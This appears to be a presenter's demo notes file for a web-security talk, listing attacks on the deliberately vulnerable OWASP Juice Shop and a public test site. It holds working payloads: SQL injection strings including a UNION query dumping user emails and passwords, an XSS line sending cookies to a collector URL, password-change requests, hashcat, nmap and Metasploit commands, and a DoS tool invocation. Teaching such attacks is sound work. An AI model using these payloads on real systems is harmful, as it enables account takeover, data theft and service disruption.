@@ -1,0 +1,45 @@
+DEMOS
+---------
+find scoreboard - uncomment
+sql injection in search - ';
+sql injection in login - ' or 1=1--
+login as first user (happens to be admin) - ' or 1=1--
+sql injection in search '))-- christmas
+qwert')) UNION SELECT '1', id, email, password, '5', '6', '7', '8' FROM Users--
+/administration - juice-shop.min.js
+<script>document.location='http://localhost:8081/attack?'+document.cookie</script>
+path sniffing - about us - http://localhost:3000/ftp/legal.md?md_debug=true
+logic handles - rating toggle - http://localhost:3000/#/contact
+http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test'
+storage - basket - change bid
+http://localhost:3000/ftp/coupons_2013.md.bak?md_debug=.md
+GET/POST requests - http://localhost:3000/rest/user/change-password?current=vigabhi92&new=vigabhi92&repeat=vigabhi92
+Login with specific email - bender@juice-sh.op'--
+http://localhost:3000/rest/user/change-password?new=slurmCl4ssic&repeat=slurmCl4ssic
+Rich order - http://localhost:3000/api/BasketItems/1
+Big file uploads - http://localhost:3000/file-upload
+packet sniffing - wireshark
+Dos attack - python hulk.py
+
+https://www.propub3r6espa33w.onion/ and http://deepdot35wvmeyd5.onion/ and https://blockchainbdgpzk.onion/
+https://ahmia.fi/stats/link_graph/
+
+Kali linux - Metasploit, hashcat, nmap
+
+sudo nmap -O thenuthouse.github.io
+
+search name:Microsoft type:exploit
+info pathurl
+
+hashcat -m 0 -a 0 /root/Desktop/hashes.txt /root/Desktop/rockyou.txt
+
+Exploit database - https://www.exploit-db.com/
+
+https://www.fireeye.com/cyber-map/threat-map.html
+DDOS - http://www.digitalattackmap.com/
+
+https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/
+
+bullet proof hosting - https://in.norton.com/mostdangeroustown2
+
+defcon - https://www.defcon.org/
